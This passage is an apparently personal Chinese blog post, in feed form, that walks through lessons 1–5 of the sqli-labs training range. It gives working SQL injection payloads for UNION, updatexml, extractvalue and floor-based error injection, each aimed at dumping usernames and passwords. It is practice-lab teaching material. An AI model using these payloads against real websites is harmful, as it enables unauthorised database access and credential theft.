        <id>https://hq185187.github.io/2023/04/28/sqli-labs/</id>
        <title>Sqli-labs靶场通关</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/04/28/sqli-labs/"/>
        <content type="html">&lt;h3 id=&#34;怎么判断字符型或者数字型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#怎么判断字符型或者数字型&#34;&gt;#&lt;/a&gt; 怎么判断字符型或者数字型？&lt;/h3&gt;
&lt;p&gt;数字型:id=2 和 id=3-1 返回界面相同&lt;br&gt;
原理：说明 2-1 被解析了，旁边没有引号&lt;br&gt;
字符型:id=2 和 id=2a 页面一样就行&lt;br&gt;
原理：MySQL 等号两边类型不一致会发生强制转换，字符串 -&amp;gt; 数字&lt;/p&gt;
&lt;p&gt;group_concat 是用，连接多行记录的函数&lt;br&gt;
 MySQL 的一些表结构：(可以通过 phpmyadmin 观察学习)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;information_schema是MySQL自带的默认数据库,里面有三个&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;表(schemata,tables,columns)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;schemata表(记载着数据库的信息),这个表里面有个字段schema_name(数据库名)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tables(表),里面有table_name字段(数据表名),和table_schema字段(当前字段所属数据表所在的数据库)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;比如security库里面有email表:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;table_schema  table_name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;security        email&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;columns表,除了table_name和table_schema字段外还有一个column_name字段(某数据库某个表的某个字段名)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less1&lt;br&gt;
 字符型注入&lt;br&gt;
看源码: &lt;code&gt;sql=&amp;quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&amp;quot;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因此:&lt;mark&gt;payload:1’   操作   --+&lt;/mark&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; order by 3--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; order by 4--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,2,3--+//判断回显位&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,2,database()--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; and table_schema=database()--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,2,group_concat(username,0x7e,password) from users--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//0x7e是为了让结过美观一点,比如Dumb~Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此外通过 &lt;code&gt;?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+&lt;/code&gt;  还有可以看到所以的数据库信息&lt;/p&gt;
&lt;p&gt;less2&lt;br&gt;
 数字型&lt;br&gt;
看源码: &lt;code&gt;sql=&amp;quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&amp;quot;;&lt;/code&gt; &lt;br&gt;
 直接输入数字就好，解法与 less1 相同，去掉 less1 的’和–+ 即可&lt;/p&gt;
&lt;p&gt;布尔盲注:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1 union select 1,2,group_concat(username,0x7e,password) from users&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less3&lt;br&gt;
 源码: &lt;code&gt;$sql=&amp;quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&amp;quot;;&lt;/code&gt; &lt;br&gt;
 单引号括号字符型闭合&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27;) union select 1,2,group_concat(username,0x7e,password) from users--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less4&lt;br&gt;
 源码: &lt;code&gt;$id = &#39;&amp;quot;&#39; . $id . &#39;&amp;quot;&#39;;$sql=&amp;quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&amp;quot;;&lt;/code&gt; &lt;br&gt;
 双引号括号字符型闭合&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;quot;) union select 1,2,group_concat(username,0x7e,password) from users--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;less5&lt;br&gt;
 此题不回显 SQL 语句的结果了，只回显 (You are in… 或者无回显), 但是源代码有 &lt;code&gt;print_r(mysql_error());&lt;/code&gt;  会将语法错误打印出来，我们已知字段数是 3, 写入 &lt;code&gt;?id=1&#39; order by 4--+&lt;/code&gt;  发现成功回显，因此可以用报错注入&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;报错注入:updatexml()函数,extractvalue()函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;updatexml(xml_doument,XPath_string,new_value)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第一个参数：XML的内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第二个参数：是需要update的位置XPATH路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第三个参数：是更新后的内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式 ,不对就爆出正确内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;可以校验的:0x7e(~),0x5e24(^$),&amp;#x27;#&amp;#x27;(#)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;extractvalue（XML_document，xpath_string）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第一个参数是XML对象的名称,随便写,第二个参数是XPAT和格式的字符串,主要让它格式出现错误&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and extractvalue(1,concat(0x7e,(select database())))--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;一些截取函数技巧:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;concat(参数1,参数2) 将参数1与参数2连接起来&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;substring(目标,起始,长度)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;substr,mid用法一样&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;还有right(column_name,length)从右侧读取length长度和reverse()反转字符串函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload1:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and updatexml(1,concat(0x7e,database()),1)--+暴当前数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1)--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;此时会出现Subquery returns more than 1 row&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;根据提示可以知道结果有多行,本地复现一下&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mysql&amp;gt; select table_name from information_schema.tables where table_schema=database();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| table_name |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| emails     |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| referers   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| uagents    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| users      |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4 rows in set (0.00 sec)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.可以用limit解决,limit 0,1 1,1 2,1 3,1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在limit 3,1找到users表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 3,1)),1)--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后面同理爆字段,不过很麻烦&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.加个group_concat(将多行数据用逗号连接)把所有表名连接成一行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;此时结果:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; emails,referers,uagents,users&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;最后:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users)),1)--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这时问题又来了,只能读取前面的(31个字符),这时候需要用来截取函数了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username,0x7e,password) from users),1,31)),1)--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在改变1和31的值来读后面的内容&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload2:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and extractvalue(1,concat(0x7e,(select database())))--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())))--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后遇到和上面一样的问题&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; and table_schema=database())))--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and extractvalue(1,substr(concat(0x7e,(select group_concat(username,0x7e,password) from users)),1,31))--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后修改1,31的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;floor () 报错注入&lt;br&gt;
 &lt;code&gt;select count(*),concat_wa(&#39;-&#39;,(select database()),floor(rand(0)* 2)) as x from information_schema.tables group by x;&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;rand():随机返回&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;之间的小数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand()&lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:随机返回&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;之间的小数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;floor&lt;/span&gt;():小数向下取整数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;concat_ws(参数&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,参数&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,参数&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;):将括号内数据用第一个字段连接起来&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;例: concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;~&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) 结果为 &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;by&lt;/span&gt;语句:分组统计&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt;:赋予别名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;count&lt;/span&gt;():汇总统计&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;一次只能返回&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;个字符&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;原理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;通过&lt;span class=&#34;built_in&#34;&gt;floor&lt;/span&gt;(rand(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)产生的有一定顺序的数,在分组统计的时候重复计算导致最后只有一组数据产生错误&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload3:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; union select 1,count(*),concat_ws(&amp;#x27;-&amp;#x27;,(select database()),floor(rand(0)*2)) as x from information_schema.tables group by x --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; union select 1,count(*),concat_ws(&amp;#x27;-&amp;#x27;,(select group_concat(table_name) from information_schema.tables where table_schema = database()),floor(rand(0)*2)) as x from information_schema.tables group by x 